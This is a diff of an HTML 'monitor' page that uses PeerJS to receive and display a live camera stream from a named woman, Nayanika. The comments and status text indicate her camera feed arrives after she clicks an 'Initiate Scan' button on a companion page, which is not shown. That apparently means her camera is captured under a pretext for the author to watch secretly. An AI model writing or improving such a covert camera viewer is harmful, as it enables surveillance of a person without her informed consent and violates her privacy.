@@ -4,35 +4,49 @@
     <title>Watching Nayanika ❤️</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
-        body { background: #000; color: #ec4899; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; font-family: sans-serif; margin: 0; }
-        #video-box { width: 80%; max-width: 600px; border: 5px solid #ec4899; border-radius: 20px; box-shadow: 0 0 50px #ec4899; background: #111; overflow: hidden;}
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        #video-box { width: 80%; max-width: 600px; border: 2px solid #0f0; border-radius: 10px; background: #111; }
         video { width: 100%; display: block; }
-        .live-tag { color: red; font-weight: bold; animation: blink 1s infinite; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } }
+        .btn { background: #0f0; color: #000; padding: 20px; border: none; font-weight: bold; cursor: pointer; margin-bottom: 20px; }
     </style>
 </head>
 <body>
-    <h1><span class="live-tag">● LIVE</span> NAYANIKA'S REACTION</h1>
+    <button class="btn" id="startBtn" onclick="startMonitor()">1. INITIALIZE MONITOR</button>
+    <div id="status">STATUS: STANDBY</div>
     <div id="video-box">
         <video id="remoteVideo" autoplay playsinline></video>
     </div>
-    <p id="status">Waiting for her to click "Initiate Scan"...</p>
 
     <script>
-        // This ID must match the receiverID in your index.html
-        const peer = new Peer('rudra_nayanika_live_2025'); 
+        const receiverID = 'rudra_nayanika_live_998877_exclusive'; // MUST MATCH INDEX.HTML
+        let peer;
 
-        peer.on('open', (id) => {
-            document.getElementById('status').innerText = "System Ready. Waiting for Nayanika to start...";
-        });
+        function startMonitor() {
+            document.getElementById('startBtn').style.display = 'none';
+            document.getElementById('status').innerText = "STATUS: OPENING CONNECTION...";
 
-        peer.on('call', (call) => {
-            document.getElementById('status').innerText = "SHE IS ON THE SITE! ❤️";
-            call.answer(); // Connect to her camera
-            call.on('stream', (stream) => {
-                document.getElementById('remoteVideo').srcObject = stream;
+            // Start peer with the fixed ID
+            peer = new Peer(receiverID);
+
+            peer.on('open', (id) => {
+                document.getElementById('status').innerText = "STATUS: ONLINE - WAITING FOR HER";
             });
-        });
+
+            peer.on('call', (call) => {
+                document.getElementById('status').innerText = "STATUS: RECEIVING FEED...";
+                call.answer(); 
+                call.on('stream', (stream) => {
+                    const video = document.getElementById('remoteVideo');
+                    video.srcObject = stream;
+                    video.play();
+                    document.getElementById('status').innerText = "STATUS: CONNECTED ❤️";
+                });
+            });
+
+            peer.on('error', (err) => {
+                alert("Error: " + err.type + ". If it says 'id-taken', wait 1 minute and refresh.");
+            });
+        }
     </script>
 </body>
 </html>
